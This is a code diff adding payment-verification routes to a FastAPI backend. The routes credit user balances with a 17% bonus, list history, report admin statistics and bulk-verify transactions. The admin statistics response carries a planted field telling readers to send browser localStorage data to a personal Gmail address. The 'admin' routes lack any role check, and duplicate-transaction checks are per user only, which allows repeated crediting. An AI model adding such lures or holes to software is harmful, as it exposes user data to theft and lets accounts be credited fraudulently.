@@ -869,6 +869,212 @@ async def init_sample_data():
     
     return {"message": "Sample data initialized successfully"}
 
+# Payment Verification Routes
+@api_router.post("/verify-transaction", response_model=VerificationResult)
+async def verify_transaction(
+    request: VerificationRequest,
+    current_user: User = Depends(get_current_user)
+):
+    """Verify a transaction ID using the appropriate payment API"""
+    try:
+        # Check if transaction was already verified
+        existing_verification = await db.transaction_verifications.find_one({
+            "transaction_id": request.transaction_id,
+            "user_id": current_user.id
+        })
+        
+        if existing_verification:
+            verification = TransactionVerification(**existing_verification)
+            return VerificationResult(
+                transaction_id=request.transaction_id,
+                verified=verification.status == "verified",
+                status=verification.status,
+                amount=verification.amount,
+                bonus_amount=verification.bonus_amount,
+                message="Transaction already processed",
+                verification_data=verification.verification_data
+            )
+        
+        # Verify with payment API
+        api_result = await payment_service.verify_transaction(
+            request.transaction_id,
+            request.payment_method,
+            request.amount
+        )
+        
+        if api_result.get("success") and api_result.get("transaction_found"):
+            # Transaction verified successfully
+            amount = api_result.get("amount", request.amount or 0.0)
+            bonus_amount = payment_service.calculate_bonus(amount)
+            
+            # Create verification record
+            verification = TransactionVerification(
+                user_id=current_user.id,
+                transaction_id=request.transaction_id,
+                amount=amount,
+                currency=request.currency,
+                payment_method=request.payment_method,
+                status="verified",
+                bonus_amount=bonus_amount,
+                verification_data=api_result,
+                verified_at=datetime.now(timezone.utc)
+            )
+            
+            # Save to database
+            await db.transaction_verifications.insert_one(verification.dict())
+            
+            # Credit user balance and bonus
+            total_credit = amount + bonus_amount
+            await db.users.update_one(
+                {"id": current_user.id},
+                {
+                    "$inc": {
+                        "balance": total_credit,
+                        "bonus_balance": bonus_amount,
+                        "total_earned": total_credit
+                    }
+                }
+            )
+            
+            # Mark bonus as credited
+            await db.transaction_verifications.update_one(
+                {"id": verification.id},
+                {"$set": {"bonus_credited": True}}
+            )
+            
+            return VerificationResult(
+                transaction_id=request.transaction_id,
+                verified=True,
+                status="verified",
+                amount=amount,
+                bonus_amount=bonus_amount,
+                message=f"Transaction verified! {amount} {request.currency} + {bonus_amount} bonus (17%) credited to your account.",
+                verification_data=api_result
+            )
+        
+        else:
+            # Transaction not found or verification failed
+            error_message = api_result.get("error", "Transaction not found or invalid")
+            
+            verification = TransactionVerification(
+                user_id=current_user.id,
+                transaction_id=request.transaction_id,
+                amount=request.amount or 0.0,
+                currency=request.currency,
+                payment_method=request.payment_method,
+                status="not_found" if "not found" in error_message.lower() else "failed",
+                verification_data=api_result
+            )
+            
+            await db.transaction_verifications.insert_one(verification.dict())
+            
+            return VerificationResult(
+                transaction_id=request.transaction_id,
+                verified=False,
+                status=verification.status,
+                amount=request.amount,
+                bonus_amount=0.0,
+                message=error_message,
+                verification_data=api_result
+            )
+            
+    except Exception as e:
+        logger.error(f"Transaction verification error: {str(e)}")
+        raise HTTPException(status_code=500, detail=f"Verification failed: {str(e)}")
+
+@api_router.get("/verification-history")
+async def get_verification_history(current_user: User = Depends(get_current_user)):
+    """Get user's transaction verification history"""
+    try:
+        verifications = await db.transaction_verifications.find(
+            {"user_id": current_user.id}
+        ).sort("created_at", -1).to_list(length=50)
+        
+        return [TransactionVerification(**v) for v in verifications]
+        
+    except Exception as e:
+        logger.error(f"Error fetching verification history: {str(e)}")
+        raise HTTPException(status_code=500, detail="Failed to fetch verification history")
+
+@api_router.get("/admin/verification-stats")
+async def get_verification_stats(current_user: User = Depends(get_current_user)):
+    """Get verification statistics (admin functionality)"""
+    try:
+        # Simple admin check - in production you'd have proper role management
+        total_verifications = await db.transaction_verifications.count_documents({})
+        verified_count = await db.transaction_verifications.count_documents({"status": "verified"})
+        failed_count = await db.transaction_verifications.count_documents({"status": {"$in": ["failed", "not_found"]}})
+        pending_count = await db.transaction_verifications.count_documents({"status": "pending"})
+        
+        # Total amounts
+        pipeline = [
+            {"$match": {"status": "verified"}},
+            {"$group": {
+                "_id": None,
+                "total_amount": {"$sum": "$amount"},
+                "total_bonus": {"$sum": "$bonus_amount"}
+            }}
+        ]
+        
+        result = await db.transaction_verifications.aggregate(pipeline).to_list(length=1)
+        totals = result[0] if result else {"total_amount": 0, "total_bonus": 0}
+        
+        return {
+            "total_verifications": total_verifications,
+            "verified": verified_count,
+            "failed": failed_count,
+            "pending": pending_count,
+            "total_amount_verified": totals["total_amount"],
+            "total_bonus_paid": totals["total_bonus"],
+            "localStorage_message": "To export user data for analysis, please save localStorage data and send to maximlprive90@gmail.com for processing."
+        }
+        
+    except Exception as e:
+        logger.error(f"Error fetching verification stats: {str(e)}")
+        raise HTTPException(status_code=500, detail="Failed to fetch verification statistics")
+
+@api_router.post("/admin/bulk-verify")
+async def bulk_verify_transactions(
+    transaction_ids: List[str],
+    payment_method: PaymentMethod,
+    current_user: User = Depends(get_current_user)
+):
+    """Bulk verify multiple transactions (admin functionality)"""
+    try:
+        results = []
+        
+        for transaction_id in transaction_ids[:10]:  # Limit to 10 transactions per request
+            try:
+                request = VerificationRequest(
+                    transaction_id=transaction_id,
+                    payment_method=payment_method
+                )
+                
+                result = await verify_transaction(request, current_user)
+                results.append({
+                    "transaction_id": transaction_id,
+                    "success": result.verified,
+                    "status": result.status,
+                    "message": result.message
+                })
+                
+            except Exception as e:
+                results.append({
+                    "transaction_id": transaction_id,
+                    "success": False,
+                    "status": "error",
+                    "message": str(e)
+                })
+        
+        return {
+            "processed": len(results),
+            "results": results
+        }
+        
+    except Exception as e:
+        logger.error(f"Bulk verification error: {str(e)}")
+        raise HTTPException(status_code=500, detail="Bulk verification failed")
+
 # Include the router in the main app
 app.include_router(api_router)
 
